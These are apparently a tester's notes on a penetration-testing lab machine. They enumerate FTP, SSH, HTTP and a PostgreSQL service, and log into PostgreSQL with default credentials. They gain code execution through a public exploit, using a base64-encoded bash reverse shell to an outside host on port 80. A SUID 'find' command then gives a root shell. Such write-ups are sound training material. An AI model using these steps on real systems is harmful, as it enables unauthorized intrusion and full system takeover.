# System Information
OS: Debian
IP: 192.168.112.47

---
# Service Enumeration
## 21/tcp FTP
vsftpd 3.0.3

Guessed:
- anonymous:anonymous
- nibbles:nibbles

## 22/tcp SSH
OpenSSH 7.9p1 Debian 10+deb10u2

Guessed:
- anonymous:anonymous
- nibbles:nibbles
## 80/tcp HTTP

Apache/2.4.38 

![[Pasted image 20260827223005.png]]

HTML is from this book?...
https://www.dummies.com/article/technology/programming-web-design/html/a-sample-web-page-in-html-189340/

## 5437/tcp Service

Searching online for this port number suggests it's likely Postgresql configured to run on non-default port. 

Default credentials?

Guess:
- postgres:postgres

Success.

psql (18.3 (Debian 18.3-1+b1), server 11.7 (Debian 11.7-0+deb10u1))

Search version + vulnerability:

https://www.exploit-db.com/exploits/50847

![[Pasted image 20260827224740.png]]

Success, giving us code execution as `postgres`.


# Initial Access

Get a reverse shell on port 80 (firewall bypass).

`python3 50847.py -i $IP -p 5437  -c 'printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xOTQvODAgMD4mMSkgJg==|base64 -d|bash'`

# Privilege Escalation

`find / -perm -u=s -type f 2>/dev/null`

![[Pasted image 20260827230541.png]]

Find is unusual among SUID binaries.

https://gtfobins.org/gtfobins/find/#shell

`find . -exec /bin/sh -p \; -quit` spawns a shell as root.

# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)

![[Pasted image 20260827230823.png]]